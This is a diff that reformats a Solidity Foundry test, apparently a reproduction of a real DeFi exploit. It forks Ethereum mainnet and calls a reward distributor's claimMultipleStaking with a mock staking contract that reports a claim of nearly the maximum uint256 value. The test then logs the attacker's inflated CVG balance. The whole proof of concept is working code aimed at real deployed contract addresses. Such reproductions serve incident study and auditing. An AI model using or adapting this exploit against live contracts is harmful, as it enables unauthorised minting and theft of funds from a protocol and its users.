@@ -18,13 +18,12 @@ interface ICommonStruct {
 }
 
 interface ICvxStakingPositionService {
-
-    function claimCvgCvxMultiple(address account) external returns (uint256, ICommonStruct.TokenAmount[] memory);
-
+    function claimCvgCvxMultiple(
+        address account
+    ) external returns (uint256, ICommonStruct.TokenAmount[] memory);
 }
 
-interface ICvxRewardDistributor{
-
+interface ICvxRewardDistributor {
     function claimMultipleStaking(
         ICvxStakingPositionService[] calldata claimContracts,
         address _account,
@@ -32,25 +31,20 @@ interface ICvxRewardDistributor{
         bool _isConvert,
         uint256 cvxRewardCount
     ) external;
-
 }
 
-interface ICurveTwocryptoOptimized{
-    function exchange ( uint256 i, uint256 j, uint256 dx, uint256 min_dy, address receiver ) external returns ( uint256 );
+interface ICurveTwocryptoOptimized {
+    function exchange(uint256 i, uint256 j, uint256 dx, uint256 min_dy, address receiver) external returns (uint256);
 }
-
 
 contract ContractTest is Test {
-
     ICvxRewardDistributor cvxRewardDistributor = ICvxRewardDistributor(0x2b083beaaC310CC5E190B1d2507038CcB03E7606);
     IERC20 CVG = IERC20(0x97efFB790f2fbB701D88f89DB4521348A2B77be8);
     ICurveTwocryptoOptimized CVGETH = ICurveTwocryptoOptimized(0x004C167d27ADa24305b76D80762997Fa6EB8d9B2);
     ICurveTwocryptoOptimized CVGFRAX = ICurveTwocryptoOptimized(0xa7B0E924c2dBB9B4F576CCE96ac80657E42c3e42);
-    
-
 
     function setUp() public {
-        vm.createSelectFork("mainnet", 20434450 - 1);
+        vm.createSelectFork("mainnet", 20_434_450 - 1);
     }
 
     function testExploit() external {
@@ -61,35 +55,24 @@ contract ContractTest is Test {
 
         CVG.totalSupply();
 
-        cvxRewardDistributor.claimMultipleStaking(
-            claimContracts,
-            address(this),
-            1,
-            true,
-            1
-        );
+        cvxRewardDistributor.claimMultipleStaking(claimContracts, address(this), 1, true, 1);
 
         uint256 cvg_bal = CVG.balanceOf(address(this));
 
-        emit log_named_decimal_uint("[End] Attacker CVG balance after exploit", cvg_bal , 18);
-
+        emit log_named_decimal_uint("[End] Attacker CVG balance after exploit", cvg_bal, 18);
     }
-    
 
     receive() external payable {}
 }
 
-
 contract Mock {
-
     IERC20 CVG = IERC20(0x97efFB790f2fbB701D88f89DB4521348A2B77be8);
 
-    function claimCvgCvxMultiple(address account) external returns (uint256, ICommonStruct.TokenAmount[] memory) {
-
+    function claimCvgCvxMultiple(
+        address account
+    ) external returns (uint256, ICommonStruct.TokenAmount[] memory) {
         ICommonStruct.TokenAmount[] memory tokenAmount = new ICommonStruct.TokenAmount[](0);
 
-        return ( type(uint256).max - CVG.totalSupply(), tokenAmount);
-
+        return (type(uint256).max - CVG.totalSupply(), tokenAmount);
     }
-
 }
